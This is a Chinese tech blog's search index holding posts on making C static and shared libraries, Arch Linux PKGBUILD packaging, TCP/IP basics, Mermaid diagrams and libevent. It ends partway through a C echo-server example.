<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>c语言库的制作</title>
    <link href="/2022/05/18/c%E8%AF%AD%E8%A8%80%E5%BA%93%E7%9A%84%E5%88%B6%E4%BD%9C/"/>
    <url>/2022/05/18/c%E8%AF%AD%E8%A8%80%E5%BA%93%E7%9A%84%E5%88%B6%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="c语言库的制作"><a href="#c语言库的制作" class="headerlink" title="c语言库的制作"></a>c语言库的制作</h1><h3 id="1-静态库和动态库的制作"><a href="#1-静态库和动态库的制作" class="headerlink" title="1.静态库和动态库的制作"></a>1.静态库和动态库的制作</h3><h5 id="1-准备头文件和对应的api实现源码"><a href="#1-准备头文件和对应的api实现源码" class="headerlink" title="1.准备头文件和对应的api实现源码"></a>1.准备头文件和对应的api实现源码</h5><p>1.mylib.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">interface</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><p>1.mylib.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mylib.h&quot;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">interface</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;this is my first interface &quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="制作静态库"><a href="#制作静态库" class="headerlink" title="制作静态库"></a>制作静态库</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#编译目标文件</span><br>gcc -c mylib.c -o mylib.o<br><span class="hljs-comment">#制作静态库文件</span><br>ar crs libmylib.a mylib.o<br></code></pre></td></tr></table></figure><h6 id="制作动态库"><a href="#制作动态库" class="headerlink" title="制作动态库"></a>制作动态库</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#编译目标文件</span><br>gcc -c mylib.c -o mylib.o<br><span class="hljs-comment">#制作动态链接库、</span><br>gcc -shared -o libmylib.so mylib.o<br></code></pre></td></tr></table></figure><h3 id="2-自定义库的使用"><a href="#2-自定义库的使用" class="headerlink" title="2.自定义库的使用"></a>2.自定义库的使用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*main.c*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mylib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    interface();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="静态库的使用"><a href="#静态库的使用" class="headerlink" title="静态库的使用"></a>静态库的使用</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#编译</span><br>gcc -L. -lmylib main.c -o main<br><span class="hljs-comment">#运行</span><br>./main<br></code></pre></td></tr></table></figure><h6 id="动态库的使用"><a href="#动态库的使用" class="headerlink" title="动态库的使用"></a>动态库的使用</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">编译目标文件<br>gcc -L. -lmylib main.c -o main<br><span class="hljs-comment">#运行</span><br><span class="hljs-comment">#是指动态链接库的路径,(可以设置LD_LIBRARY_PATH的值或者是将编译好的动态链接库拷贝至/usr/lib路径下)</span><br><span class="hljs-built_in">export</span> LD_LIBRARY_PATH=.<br>./main<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>嵌入式开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>archlinux打包软件包步骤</title>
    <link href="/2022/04/24/archlinux%E6%89%93%E5%8C%85%E8%BD%AF%E4%BB%B6%E5%8C%85%E6%AD%A5%E9%AA%A4/"/>
    <url>/2022/04/24/archlinux%E6%89%93%E5%8C%85%E8%BD%AF%E4%BB%B6%E5%8C%85%E6%AD%A5%E9%AA%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Archlinux打包软件包步骤"><a href="#Archlinux打包软件包步骤" class="headerlink" title="Archlinux打包软件包步骤"></a>Archlinux打包软件包步骤</h1><h3 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h3><p>archlinux中的软件包都是通过makepkg来打包的,makepkg工具会读取一个PKGBUILD的脚本,按照脚本里面的规则自动构建软件包,打包完成后会在打包的目录下面生成一个.pkg.tar.zst的文件,这个文件可以直接使用pacman包管理工具安装(pacman -U name.pkg.tar.zst)</p><h3 id="2-打包前的准备"><a href="#2-打包前的准备" class="headerlink" title="2.打包前的准备"></a>2.打包前的准备</h3><p>首先要准本打包的工具,一般有base-devel这个软件包就足够了,通常makepkg在打包的过程中主要做以下几个步骤:</p><ul><li><p>1.检查软件包的相关依赖是否已经安装</p></li><li><p>2.从指定的服务器下载软件包对应的源代码</p></li><li><p>3.解压对应的源代码</p></li><li><p>4.编译源码,并将其安装在伪root目录下面</p></li><li><p>5.生成包的元数据(metadata)</p></li><li><p>6.将伪root环境打包为一个tar文件后用zstd将其压缩</p></li><li><p>7.将生成的打包好的软件保存至配置好的目录下面</p></li></ul><h3 id="3-PKGBUILD写法"><a href="#3-PKGBUILD写法" class="headerlink" title="3.PKGBUILD写法"></a>3.PKGBUILD写法</h3><p>  PKGBUILD脚本中一般有以下几个变量和函数</p><ul><li>变量</li></ul><p>  1.pkgdesc</p><p>  软件包的描述信息</p><p>  2.pkgdir</p><p>  软件包存储的目录</p><p>  3.pkgname</p><p>  软件包的名称</p><p>  4.pkgver</p><p>  软件包的版本</p><p>  5.source</p><p>  软件的源码</p><p>  6.arch</p><p>  软件适用的架构,如果和平台无关可以直接填写any</p><p>  7.license</p><p>  软件的许可证</p><p>  8.depens</p><p>  软件的依赖</p><p>  9.srcdir</p><p>  软件源码的目录</p><ul><li><p>函数</p><p>1.prepare()</p><p>此函数会执行用于预处理源文件执行的命令,例如patch,此函数执行在build之前</p><p>2.pkgver()</p><p>此函数会抓取并解压源文件,执行完prepare函数后执行此函数</p><p>3.build()</p><p>此函数第一步先进入源代码的目录下,makepkg会在执行build函数之前更改当前目录为pkgdir目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-variable">$pkgdir</span>/<span class="hljs-variable">$pkgname</span>-<span class="hljs-variable">$pkgver</span>&quot;</span><br>./configure --prefix=/usr<br>make<br></code></pre></td></tr></table></figure><p>4.package()</p><p>此函数会将编译好的文件安装值伪root环境下面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make DESTDIR=<span class="hljs-string">&quot;<span class="hljs-variable">$pkgdir</span>/&quot;</span> install <br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>linux软件打包</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TCP/IP协议</title>
    <link href="/2022/04/18/TCP-IP%E5%8D%8F%E8%AE%AE/"/>
    <url>/2022/04/18/TCP-IP%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="TCP-x2F-IP协议"><a href="#TCP-x2F-IP协议" class="headerlink" title="TCP&#x2F;IP协议"></a>TCP&#x2F;IP协议</h1><h4 id="1-什么是TCP-x2F-IP协议"><a href="#1-什么是TCP-x2F-IP协议" class="headerlink" title="1.什么是TCP&#x2F;IP协议?"></a>1.什么是TCP&#x2F;IP协议?</h4><p>TCP&#x2F;IP（Transmission Control Protocol&#x2F;Internet Protocol，传输控制协议&#x2F;网际协议）是指能够在多个不同网络间实现信息传输,网络通信的协议簇。TCP&#x2F;IP协议不仅仅指的是TCP 和IP两个协议，而是指一个由FTP、SMTP、TCP、UDP、IP等协议构成的协议簇， 只是因为在TCP&#x2F;IP协议中TCP协议和IP协议最具代表性，所以被称为TCP&#x2F;IP协议。</p><h4 id="2-TCP-x2F-IP协议的具体含义"><a href="#2-TCP-x2F-IP协议的具体含义" class="headerlink" title="2.TCP&#x2F;IP协议的具体含义"></a>2.TCP&#x2F;IP协议的具体含义</h4><p>从字面意义上讲，有人可能会认为 TCP&#x2F;IP 是指 TCP 和 IP 两种协议。实际生活当中有时也确实就是指这两种协议。然而在很多情况下，它只是利用 IP 进行通信时所必须用到的协议群的统称。具体来说，IP 或 ICMP、TCP 或 UDP、TELNET 或 FTP、以及 HTTP 等都属于 TCP&#x2F;IP 协议。他们与 TCP 或 IP 的关系紧密，是互联网必不可少的组成部分。TCP&#x2F;IP 一词泛指这些协议，因此，有时也称 TCP&#x2F;IP 为网际协议群。</p><p>互联网进行通信时，需要相应的网络协议，TCP&#x2F;IP 原本就是为使用互联网而开发制定的协议族。因此，互联网的协议就是 TCP&#x2F;IP，TCP&#x2F;IP 就是互联网的协议。</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>markdown画流程图</title>
    <link href="/2022/04/18/markdown%E7%94%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/"/>
    <url>/2022/04/18/markdown%E7%94%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="markdown画流程图"><a href="#markdown画流程图" class="headerlink" title="markdown画流程图"></a>markdown画流程图</h1><h4 id="1-mermaid"><a href="#1-mermaid" class="headerlink" title="1.mermaid"></a>1.mermaid</h4><p>mermaid是一种类似于markdown的脚本语言,通过javascript语言将文本转化为图片</p><h5 id="1-流程图"><a href="#1-流程图" class="headerlink" title="1.流程图"></a>1.流程图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">graph TD;<br>    A--&gt;B;<br>    A--&gt;C;<br>    B--&gt;D;<br></code></pre></td></tr></table></figure><p>实际效果</p><pre><code class=" mermaid">graph TD;    A--&gt;B;    A--&gt;C;    B--&gt;D;</code></pre><h5 id="2-时序图"><a href="#2-时序图" class="headerlink" title="2.时序图"></a>2.时序图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sequenceDiagram<br>    Alice-&gt;&gt;John: Hello John, how are you?<br>    John--&gt;&gt;Alice: Great!<br></code></pre></td></tr></table></figure><p>实际效果</p><pre><code class=" mermaid">sequenceDiagram    Alice-&gt;&gt;John: Hello John, how are you?    John--&gt;&gt;Alice: Great!</code></pre><h5 id="3-状态图"><a href="#3-状态图" class="headerlink" title="3.状态图"></a>3.状态图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">stateDiagram<br>    [*] --&gt; s1<br>    s1 --&gt; [*]<br></code></pre></td></tr></table></figure><pre><code class=" mermaid">stateDiagram    [*] --&gt; s1    s1 --&gt; [*]</code></pre><h5 id="4-类图"><a href="#4-类图" class="headerlink" title="4.类图"></a>4.类图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">classDiagram<br>      Animal &lt;|-- Duck<br>      Animal &lt;|-- Fish<br>      Animal &lt;|-- Zebra<br>      Animal : +int age<br>      Animal : +String gender<br>      Animal: +isMammal()<br>      Animal: +mate()<br>      class Duck&#123;<br>          +String beakColor<br>          +swim()<br>          +quack()<br>      &#125;<br>      class Fish&#123;<br>          -int sizeInFeet<br>          -canEat()<br>      &#125;<br>      class Zebra&#123;<br>          +bool is_wild<br>          +run()<br>      &#125;<br></code></pre></td></tr></table></figure><pre><code class=" mermaid">classDiagram      Animal &lt;|-- Duck      Animal &lt;|-- Fish      Animal &lt;|-- Zebra      Animal : +int age      Animal : +String gender      Animal: +isMammal()      Animal: +mate()      class Duck&#123;          +String beakColor          +swim()          +quack()      &#125;      class Fish&#123;          -int sizeInFeet          -canEat()      &#125;      class Zebra&#123;          +bool is_wild          +run()      &#125;</code></pre><h4 id="5-饼图"><a href="#5-饼图" class="headerlink" title="5.饼图"></a>5.饼图</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make menuconfig<br></code></pre></td></tr></table></figure><pre><code class=" mermaid">pie    title Key elements in Product X    &quot;Calcium&quot; : 42.96    &quot;Potassium&quot; : 50.05    &quot;Magnesium&quot; : 10.01    &quot;Iron&quot; :  5</code></pre><p>参考于:<a href="https://zhuanlan.zhihu.com/p/355997933">https://zhuanlan.zhihu.com/p/355997933</a></p>]]></content>
    
    
    <categories>
      
      <category>软件配置和使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基本软件的使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>libevent学习笔记</title>
    <link href="/2022/04/17/libevent%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/04/17/libevent%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="libevent学习笔记"><a href="#libevent学习笔记" class="headerlink" title="libevent学习笔记"></a>libevent学习笔记</h1><h3 id="1-什么是libevent"><a href="#1-什么是libevent" class="headerlink" title="1.什么是libevent?"></a>1.什么是libevent?</h3><p>Libevent 是一个用C语言编写的、轻量级的开源高性能事件通知库，主要有以下几个亮点：事件驱动（ event-driven），高性能;轻量级，专注于网络，不如 ACE 那么臃肿庞大；源代码相当精炼、易读；跨平台，支持 Windows、 Linux、 *BSD 和 Mac Os；支持多种 I&#x2F;O 多路复用技术， epoll、 poll、 dev&#x2F;poll、 select 和 kqueue 等；支持 I&#x2F;O，定时器和信号等事件；注册事件优先级。</p><h3 id="2-涉及到的基本数据类型"><a href="#2-涉及到的基本数据类型" class="headerlink" title="2.涉及到的基本数据类型"></a>2.涉及到的基本数据类型</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//事件结构体</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event_callback</span> <span class="hljs-title">ev_evcallback</span>;</span><span class="hljs-comment">//回调函数</span><br><br><span class="hljs-comment">/* for managing timeouts */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>TAILQ_ENTRY(event) ev_next_with_common_timeout;<br><span class="hljs-type">int</span> min_heap_idx;<br>&#125; ev_timeout_pos;<br><span class="hljs-type">evutil_socket_t</span> ev_fd;<span class="hljs-comment">//监听的文件描述符</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event_base</span> *<span class="hljs-title">ev_base</span>;</span><span class="hljs-comment">//绑定的event_base</span><br><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/* used for io events */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>LIST_ENTRY (event) ev_io_next;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">ev_timeout</span>;</span><br>&#125; ev_io;<br><br><span class="hljs-comment">/* used by signal events */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>LIST_ENTRY (event) ev_signal_next;<br><span class="hljs-type">short</span> ev_ncalls;<br><span class="hljs-comment">/* Allows deletes in callback */</span><br><span class="hljs-type">short</span> *ev_pncalls;<br>&#125; ev_signal;<br>&#125; ev_;<br><br><span class="hljs-type">short</span> ev_events;<span class="hljs-comment">//监听的事件</span><br><span class="hljs-type">short</span> ev_res;<span class="hljs-comment">/* result passed to event callback */</span><span class="hljs-comment">//发生的事件(传给callback函数的事件)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">ev_timeout</span>;</span><span class="hljs-comment">//超时时间</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="3-基本使用步骤"><a href="#3-基本使用步骤" class="headerlink" title="3.基本使用步骤"></a>3.基本使用步骤</h3><ul><li><p>1.创建监听对象</p></li><li><p>2.创建监听事件</p></li><li><p>3.将监听事件加入监听集合</p></li><li><p>4.开始监听</p></li></ul><h4 id="1-基本的API"><a href="#1-基本的API" class="headerlink" title="1.基本的API"></a>1.基本的API</h4>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//事件结构体</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event_callback</span> <span class="hljs-title">ev_evcallback</span>;</span><span class="hljs-comment">//回调函数</span><br><br><span class="hljs-comment">/* for managing timeouts */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>TAILQ_ENTRY(event) ev_next_with_common_timeout;<br><span class="hljs-type">int</span> min_heap_idx;<br>&#125; ev_timeout_pos;<br><span class="hljs-type">evutil_socket_t</span> ev_fd;<span class="hljs-comment">//监听的文件描述符</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event_base</span> *<span class="hljs-title">ev_base</span>;</span><span class="hljs-comment">//绑定的event_base</span><br><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/* used for io events */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>LIST_ENTRY (event) ev_io_next;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">ev_timeout</span>;</span><br>&#125; ev_io;<br><br><span class="hljs-comment">/* used by signal events */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>LIST_ENTRY (event) ev_signal_next;<br><span class="hljs-type">short</span> ev_ncalls;<br><span class="hljs-comment">/* Allows deletes in callback */</span><br><span class="hljs-type">short</span> *ev_pncalls;<br>&#125; ev_signal;<br>&#125; ev_;<br><br><span class="hljs-type">short</span> ev_events;<span class="hljs-comment">//监听的事件</span><br><span class="hljs-type">short</span> ev_res;<span class="hljs-comment">/* result passed to event callback */</span><span class="hljs-comment">//发生的事件(传给callback函数的事件)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">ev_timeout</span>;</span><span class="hljs-comment">//超时时间</span><br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="2-实例"><a href="#2-实例" class="headerlink" title="2.实例"></a>2.实例</h4><h5 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h5>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//服务器</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;event.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;event2/listener.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-comment">//转换ip地址类型</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">convertip_to_str</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">char</span> *str_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *port)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">addr_tmp</span> =</span> (<span class="hljs-keyword">struct</span> sockaddr_in *) addr;<br>    <span class="hljs-keyword">if</span> (inet_ntop(af, &amp;(addr_tmp-&gt;sin_addr), str_addr, SOCKLEN) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    *port = ntohs(addr_tmp-&gt;sin_port);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//转换ip地址类型</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">convertip_to_net</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">char</span> *str_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> port)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">addr_tmp</span> =</span> (<span class="hljs-keyword">struct</span> sockaddr_in *) addr;<br>    addr_tmp-&gt;sin_port = htons(port);<br>    <span class="hljs-keyword">if</span> (inet_pton(af, str_addr, &amp;(addr_tmp-&gt;sin_addr)) != <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;convert ip failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//帮助信息</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Usage</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage:\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s SERVERADDR SERVERPORT\n&quot;</span>, str);<br>&#125;<br><br><span class="hljs-comment">//创建新的socket</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">NewSocket</span><span class="hljs-params">(<span class="hljs-type">char</span> *addr, <span class="hljs-type">char</span> *port, <span class="hljs-type">int</span> backlog)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">ADDR</span>;</span><br>    convertip_to_net(AF_INET, &amp;ADDR, addr, atoi(port));<br>    <span class="hljs-type">int</span> fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (bind(fd, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;ADDR, SOCKLEN) != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;bind&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (listen(fd, backlog) != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;listen&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> fd;<br>&#125;<br><span class="hljs-comment">//处理客户端请求</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">handler_cb</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">short</span> event, <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">client</span>;</span><br>    <span class="hljs-type">int</span> client_fd = accept(fd, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;client, &amp;SOCKLEN);<br>    <span class="hljs-type">char</span> client_addr[<span class="hljs-number">15</span>];<br>    <span 